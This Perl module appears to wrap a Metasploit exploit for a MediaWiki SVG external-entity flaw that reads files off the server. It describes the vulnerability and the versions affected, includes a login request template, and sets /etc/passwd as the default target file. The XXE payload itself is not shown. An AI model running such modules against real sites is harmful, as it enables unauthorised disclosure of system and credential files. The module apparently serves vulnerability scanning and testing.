package MEDIAWIKI::MSF::MediawikiSvgFileaccess;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "MediawikiSvgFileaccess";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module attempts to read a remote file from the server using a vulnerability

        in the way MediaWiki handles SVG files. The vulnerability occurs while trying to

        expand external entities with the SYSTEM identifier. In order to work MediaWiki must

        be configured to accept upload of SVG files. If anonymous uploads are allowed the

        username and password aren't required, otherwise they are. This module has been

        tested successfully on MediaWiki 1.19.4, 1.20.3 on Ubuntu 10.04 and Ubuntu 12.10.

        Older versions were also tested but do not seem to be vulnerable to this vulnerability.

        The following MediaWiki requirements must be met: File upload must be enabled,

        \$wgFileExtensions[] must include 'svg', \$wgSVGConverter must be set to something

        other than 'false'.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "mediawiki_svg_fileaccess",
  OSVDB       => 92490,
  PATH        => "title=Special:UserLogin&returnto=Main+Page&title=Special:UserLogin&returnto=Main+Page&title=Special:UserLogin&action=submitlogin&type=login&",
  PATHS       => ["mediawiki"],
  PAYLOAD     => "wpName=__WPNAME__&wpPassword=__WPPASSWORD__&wpLoginAttempt=Log+in&wpLoginToken=__WPLOGINTOKEN__&returnto=Main+Page&",
  REFERENCES  => [
                   "https://bugzilla.wikimedia.org/show_bug.cgi?id=46859",
                   "http://www.gossamer-threads.com/lists/wiki/mediawiki-announce/350229",
                 ],
  TITLE       => "MediaWiki SVG XML Entity Expansion Remote File Access",
  VARIABLES => {
    'WPPASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'WPLOGINTOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'WPNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'RFILE' =>       { DESCRIPTION => "Remote File", VALUE => "/etc/passwd" },
    'PATH' =>       { DESCRIPTION => "Path to MediaWiki", VALUE => "/mediawiki" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
